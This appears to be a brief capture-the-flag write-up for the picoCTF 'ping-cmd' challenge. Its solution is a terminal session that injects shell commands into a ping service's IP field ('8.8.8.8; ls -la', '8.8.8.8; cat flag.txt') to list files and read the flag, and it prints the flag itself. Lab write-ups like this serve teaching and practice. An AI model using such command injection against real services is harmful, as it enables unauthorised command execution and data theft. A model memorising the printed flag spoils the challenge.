
# Reto 
### ping-cmd
## Descripcion
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?You can connect to the service here `nc mysterious-sea.picoctf.net 56115`
## Solucion
```
LiszAc-picoctf@webshell:~$ nc mysterious-sea.picoctf.net 56115
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls -la
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=8.74 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=8.76 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 8.737/8.749/8.762/0.012 ms
total 20
drwxr-x--- 1 ctf-player ctf-player   23 Mar  7 11:54 .
drwxr-xr-x 1 root       root         24 Mar  7 11:54 ..
-rw-r--r-- 1 ctf-player ctf-player  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 ctf-player ctf-player 3771 Jan  6  2022 .bashrc
-rw-r--r-- 1 ctf-player ctf-player  807 Jan  6  2022 .profile
-r-------- 1 ctf-player ctf-player   49 Mar  6 20:19 flag.txt
-r-x------ 1 ctf-player ctf-player  149 Mar  7 11:53 script.sh
8.8.8.8; cat flag.txt
LiszAc-picoctf@webshell:~$ nc mysterious-sea.picoctf.net 56115
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=8.76 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=8.76 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 8.757/8.758/8.760/0.001 ms
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_17ae04f2}
```


